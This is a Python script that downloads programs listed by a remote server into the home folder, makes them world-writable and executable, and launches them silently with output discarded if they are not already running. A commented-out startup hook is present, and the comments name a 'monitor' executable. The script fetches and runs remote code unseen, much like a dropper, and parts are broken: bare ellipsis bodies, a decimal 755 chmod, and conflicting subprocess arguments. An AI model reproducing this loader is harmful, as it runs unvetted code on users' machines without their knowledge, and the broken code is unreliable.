import os
import subprocess
import sys
import time
import urllib.request
import platform
import atexit
import shutil
import tempfile
import sys
import stat

# adding Folder_2 to the system path
sys.path.insert(0, '/Users/apple/Desktop/pkg_installer/exe-and-dmg-installer' if platform.system() =="Darwin" else "C:/Users/Prince/Desktop/python_executables" )

from utils.extractzip import extract_zip
from utils.const import SERVERURL ,bundles
baseurl = SERVERURL
INTERVAL = 10 
programs = [_[0] for  _ in bundles]
print(programs)
def is_program_running(program_name):
    system = platform.system()
    if system == "Windows":
        try:
            result = subprocess.run(['tasklist'], capture_output=True, text=True)
            return program_name in result.stdout
        except Exception as e:
            print(f"Error checking if program is running: {e}")
            return False
    elif system == "Darwin" or system == "Linux":
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            return program_name in result.stdout
        except Exception as e:
            print(f"Error checking if program is running: {e}")
            return False
    else:
        raise NotImplementedError("Unsupported operating system")

def download_program(url, path):
    try:
        urllib.request.urlretrieve(url, path)
        print(f"Downloaded: {path}")
    except Exception as e:
        print(f"Failed to download {url}: {e}")

def run_program(filename,):
    system = platform.system()
    if system == "Windows":
        process_name = filename  # E.g., 'monitor1.exe'
    elif system == "Darwin" or system == "Linux":
        print("kdkd")
        os.chmod(filename, 755)
        os.chmod(filename, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        process_name = filename  # E.g., 'monitor1'
    else:
        print("Unsupported operating system")
        return
    
    if not is_program_running(process_name):
        try:
            if system == "Windows":
             subprocess.Popen([filename],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif system == "Darwin":
             
            #   result = subprocess.run(['open', filename], capture_output=True, text=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
              result = subprocess.run(['open', filename], capture_output=True, text=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         

            else :
                print("non for now")
                return

            print(f"Started {filename}")
        except Exception as e:
            print(f"Failed to start {filename}: {e}")
    else:
        print(f"{filename} is already running.")
downloaded = True
def check_and_run_programs():
    base_dir = os.path.dirname(__file__)
    # program_path =""
    
    for program in programs:
            print(program)
            dir =os.path.expanduser("~")
            program_path = os.path.join(dir, program["name"])
            download_path = os.path.join(dir, program["path"])
            while not os.path.exists(program_path):
                try:
                    print(program_path)
                    download_program(program["url"], download_path)
                    os.chmod(download_path, 755)
                    os.chmod(download_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
                    if platform.system() == "Darwin":...
                    extract_zip(download_path,dir)
                        
                    time.sleep(INTERVAL)
                except Exception as e:...
            run_program(program_path)
            # else :
                
                
            
        # time.sleep(INTERVAL)
    
if __name__ == '__main__':
    # add_to_startup()
    check_and_run_programs()
# atexit.register(cleanup_temp_dir)